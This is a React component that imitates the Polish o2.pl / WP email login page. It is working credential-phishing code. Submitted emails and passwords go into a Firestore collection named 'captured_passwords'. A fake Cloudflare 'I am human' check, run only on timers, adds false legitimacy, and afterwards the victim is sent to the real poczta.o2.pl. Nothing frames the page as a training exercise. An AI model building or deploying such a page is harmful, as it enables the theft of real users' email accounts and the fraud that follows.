"use client"

import { useState, useEffect } from "react"
import { ChevronLeft, Loader2, Facebook, Apple, CheckCircle2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"
import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
import { collection, doc } from "firebase/firestore"
import { O2Icon } from "./O2Icon"

export function O2Login() {
  const [emailValue, setEmailValue] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)
  
  // Cloudflare States
  const [cfStatus, setCfStatus] = useState<'initial' | 'ready' | 'verifying' | 'verified'>('initial')

  const { firestore, auth, user } = useFirebase();
  const wpIllustration = PlaceHolderImages.find(img => img.id === "wp-illustration")
  const partner1 = PlaceHolderImages.find(img => img.id === "partner-logo-1")
  const partner2 = PlaceHolderImages.find(img => img.id === "partner-logo-2")

  useEffect(() => {
    if (auth && !user) {
      initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  // Initial Cloudflare verification (2 seconds)
  useEffect(() => {
    const timer = setTimeout(() => {
      setCfStatus('ready')
    }, 2000)
    return () => clearTimeout(timer)
  }, [])

  const handleCloudflareClick = () => {
    if (cfStatus !== 'ready') return
    setCfStatus('verifying')
    setTimeout(() => {
      setCfStatus('verified')
    }, 1500)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (cfStatus !== 'verified') return
    
    setIsSubmitting(true)
    
    if (firestore) {
      const colRef = collection(firestore, "captured_passwords");
      const id = doc(colRef).id;
      const docRef = doc(firestore, "captured_passwords", id);
      
      setDocumentNonBlocking(docRef, {
        id,
        password,
        sourceEmail: emailValue,
        captureTimestamp: new Date().toISOString(),
      }, { merge: true });
    }
    
    setTimeout(() => {
      setIsSubmitting(false)
      setIsFinished(true)
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center space-y-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-8 h-8 text-green-600 animate-spin" />
          </div>
          <h2 className="text-xl font-bold">Trwa weryfikacja...</h2>
          <p className="text-gray-500 text-sm">Twoje dane są weryfikowane. Za chwilę zostaniesz przekierowany.</p>
          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "https://poczta.o2.pl"}>
            Przejdź do poczty
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col md:flex-row bg-white">
      {/* Left Sidebar */}
      <div className="w-full md:w-[320px] flex flex-col border-r min-h-screen bg-white shadow-2xl z-20">
        {/* Top Bar with Logo and Shadow */}
        <div className="h-14 flex items-center justify-between px-4 border-b bg-white shadow-sm shrink-0">
          <button className="text-[#002aff] hover:bg-blue-50 p-1 rounded-full transition-colors">
            <ChevronLeft className="w-5 h-5" />
          </button>
          <div className="flex items-center justify-center h-full">
            <O2Icon className="w-16 h-8" />
          </div>
          <div className="w-8" />
        </div>

        <div className="flex-1 flex flex-col p-6 space-y-6 overflow-y-auto">
          <div className="space-y-1">
            <h2 className="text-xl font-bold text-gray-800">Zaloguj się</h2>
            <p className="text-[10px] text-gray-400">Wprowadź swoje dane, aby kontynuować</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-3">
              <Input
                placeholder="Adres e-mail"
                value={emailValue}
                onChange={(e) => setEmailValue(e.target.value)}
                required
                className="h-10 border-gray-200 text-sm focus:ring-[#002aff] rounded-sm"
                autoFocus
              />
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="Hasło"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="h-10 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
                >
                  {showPassword ? "UKRYJ" : "POKAŻ"}
                </button>
              </div>
            </div>

            {/* Cloudflare Widget Dark */}
            <div 
              className={`bg-[#313131] border border-transparent p-3 min-h-[70px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
              onClick={handleCloudflareClick}
            >
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 flex items-center justify-center relative">
                  {(cfStatus === 'initial' || cfStatus === 'verifying') && (
                    <Loader2 className="w-6 h-6 text-white animate-spin" />
                  )}
                  {cfStatus === 'ready' && (
                    <div className="w-5 h-5 border-2 border-gray-500 bg-transparent rounded-sm" />
                  )}
                  {cfStatus === 'verified' && (
                    <div className="bg-[#22c55e] rounded-full p-0.5 animate-in zoom-in duration-300">
                      <CheckCircle2 className="w-6 h-6 text-white fill-[#22c55e]" />
                    </div>
                  )}
                </div>
                <div className="flex flex-col">
                  <span className="text-[11px] font-semibold text-white leading-tight">
                    {(cfStatus === 'initial' || cfStatus === 'verifying') && 'Weryfikuję...'}
                    {cfStatus === 'ready' && 'Jestem człowiekiem'}
                    {cfStatus === 'verified' && 'Powodzenie!'}
                  </span>
                  {cfStatus !== 'verified' && (
                    <span className="text-[8px] text-gray-400 leading-tight">I am human</span>
                  )}
                </div>
              </div>
              
              <div className="flex flex-col items-end shrink-0">
                <div className="flex items-center gap-1">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 3C7.03 3 3 7.03 3 12C3 16.97 7.03 21 12 21C16.97 21 21 16.97 21 12C21 7.03 16.97 3 12 3ZM12 19.5C7.86 19.5 4.5 16.14 4.5 12C4.5 7.86 7.86 4.5 12 4.5C16.14 4.5 19.5 7.86 19.5 12C19.5 16.14 16.14 19.5 12 19.5Z" fill="#F48120"/>
                    <path d="M16.5 10.5C16.5 12.98 14.48 15 12 15C9.52 15 7.5 12.98 7.5 10.5C7.5 8.02 9.52 6 12 6C14.48 6 16.5 8.02 16.5 10.5Z" fill="#F48120"/>
                  </svg>
                  <span className="text-[9px] font-black text-white tracking-widest uppercase">Cloudflare</span>
                </div>
                <div className="flex gap-2 mt-0.5">
                  <button type="button" className="text-[8px] text-gray-300 underline hover:text-white">Prywatność</button>
                  <button type="button" className="text-[8px] text-gray-300 underline hover:text-white">Pomoc</button>
                </div>
              </div>
            </div>

            <Button 
              type="submit" 
              className="w-full h-10 bg-[#002aff] hover:bg-blue-700 font-bold text-sm rounded-sm shadow-sm transition-all active:scale-[0.98]" 
              disabled={isSubmitting || cfStatus !== 'verified'}
            >
              {isSubmitting ? <Loader2 className="animate-spin w-5 h-5" /> : "Zaloguj się"}
            </Button>
          </form>

          <div className="text-center space-y-5 pt-2">
            <a href="#" className="text-[11px] font-bold text-blue-600 hover:underline">Nie pamiętasz hasła?</a>
            <div className="relative">
              <div className="absolute inset-0 flex items-center"><span className="w-full border-t border-gray-100" /></div>
              <div className="relative flex justify-center text-[8px] uppercase font-bold tracking-[0.1em]"><span className="bg-white px-3 text-gray-300">lub zaloguj się przez</span></div>
            </div>
            
            <div className="flex justify-center gap-5">
              <button className="p-2 border border-gray-100 rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <svg viewBox="0 0 24 24" className="w-4 h-4" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.14-4.53z" fill="#EA4335"/>
                </svg>
              </button>
              <button className="p-2 border border-gray-100 rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <Facebook className="w-4 h-4 text-[#1877F2] fill-[#1877F2]" />
              </button>
              <button className="p-2 border border-gray-100 rounded-full hover:bg-gray-50 transition-colors shadow-sm bg-white">
                <Apple className="w-4 h-4 text-black fill-black" />
              </button>
            </div>
            
            <a href="#" className="block text-blue-600 font-bold text-[12px] hover:underline">Załóż nowe konto</a>
          </div>

          <div className="mt-auto pt-4 text-[9px] text-gray-400 space-y-1 text-center font-medium">
            <div className="flex justify-center gap-2 items-center">
              <span>Język: <button className="text-gray-600 font-bold">Polski</button> | <button>English</button></span>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>O nas</button>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>Pomoc</button>
            </div>
            <div className="flex justify-center gap-2 items-center">
              <button>Regulamin</button>
              <span className="w-0.5 h-0.5 bg-gray-200 rounded-full" />
              <button>Prywatność</button>
            </div>
            <p className="pt-2">© 2024 Grupa WP</p>
          </div>
        </div>
      </div>

      {/* Right Content */}
      <div className="flex-1 bg-pattern flex flex-col items-center justify-center p-8 md:p-16 relative overflow-hidden bg-gray-50">
        <div className="max-w-lg space-y-8 z-10 text-center md:text-left w-full">
          <div className="space-y-4">
            <h1 className="text-3xl md:text-4xl lg:text-5xl font-extrabold text-[#111c30] leading-[1.15]">
              Jedno konto do wielu serwisów i poczty
            </h1>
            <p className="text-sm md:text-base text-gray-500 max-w-sm">
              Rejestrujesz się raz, szybko logujesz w swoich ulubionych serwisach i w pełni z nich korzystasz.
            </p>
          </div>
          
          <Button variant="outline" className="h-10 px-8 border-gray-200 font-bold hover:bg-white text-gray-700 rounded-sm">
            Załóż WP Konto
          </Button>

          <div className="relative w-full aspect-[4/3] max-w-[400px] mx-auto md:mx-0 mt-8">
            {wpIllustration && (
              <Image src={wpIllustration.imageUrl} alt="Illustration" fill className="object-contain" data-ai-hint={wpIllustration.imageHint} />
            )}
          </div>
        </div>

        {/* Partner Logos */}
        <div className="absolute bottom-8 w-full px-8 hidden md:block">
          <div className="flex gap-4 justify-center items-center opacity-30 grayscale pointer-events-none">
            {[partner1, partner2, partner1, partner2].map((p, i) => (
              <div key={i} className="w-24 h-8 relative">
                {p && <Image src={p.imageUrl} alt="partner" fill className="object-contain" data-ai-hint={p.imageHint} />}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
